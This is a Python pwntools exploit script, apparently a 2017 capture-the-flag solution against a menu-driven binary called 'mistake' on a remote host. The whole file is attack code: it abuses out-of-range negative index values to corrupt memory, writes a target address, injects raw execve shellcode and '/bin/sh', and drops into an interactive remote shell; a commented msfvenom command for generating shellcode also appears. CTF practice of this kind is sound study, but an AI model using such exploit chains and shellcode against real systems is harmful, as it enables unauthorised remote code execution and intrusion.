#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-03 22:44:59
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./mistake"
remote_ip = "115.28.185.220"
port =  22222
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)
# for x in range(0x31):
# 	ru("> ")
# 	sd("1")
# 	ru("t: ")
# 	sd("a"*0x10)
ru("> ")
sd("1")
ru("t: ")
sd("a"*0x10)
# ru("> ")
# sd("2")
# ru("id: ")
# sd("4294967276")

for x in range(1):
	ru("> ")
	sd("3")
	ru("id: ")
	sd("4294967293")

ru("> ")
sd("3")
ru("id: ")
sd("4294967291")




for x in range(0x30):
	ru("> ")
	sd("1")
	ru("t: ")
	sd("a"*0x10)

## stage 3 change number to max

ru("> ")
sd("3")
ru("id: ")
sd("4294967290")

ru("> ")
sd("1")
ru(": ")
sd("a"*0x10)

ru("> ")
sd("3")
ru("id: ")
sd("4294967289")

ru("> ")
sd("3")
ru("id: ")
sl(str(0x30))

ru("> ")
sd("3")
ru("id: ")
sl(str(0))

ru("> ")
sd("3")
ru("id: ")
sl(str(0x30))




for x in range(0x1d):
	ru("> ")
	sd("3")
	ru("id: ")
	sl(str(0))




ru("> ")
sd("3")
ru("id: ")
sd("4294967288")


for x in range(0x1d):
	ru("> ")
	sd("1")
	ru(": ")
	sd("a"*0x10)





ru("> ")
sd("1")
ru(": ")
sl(p64(0x602078))

ru("> ")
sd("1")
ru(": ")
sd("a"*0x10)

ru("> ")
sd("1")
ru(": ")
sd("a"*0x10)




ru("> ")
sd("1")
ru(": ")
sd(p64(0xffffffed)+"\x00"*0x8)

ru("> ")
sd("3")
ru("id: ")
sd("4294967287")


ru("> ")
sd("1")
ru(": ")
sd("/bin/sh\x00")
# gdb.attach(p,"b*0x400B5C\nc")
ru("> ")
sd("1")
ru(": ")
sd("\x31\xf6\x31\xd2\x31\xc0\xb0\x3b\x0f\x05")

ru("> ")
sd("3")
ru("id: ")
sd(str(0xffffffee))


p.interactive()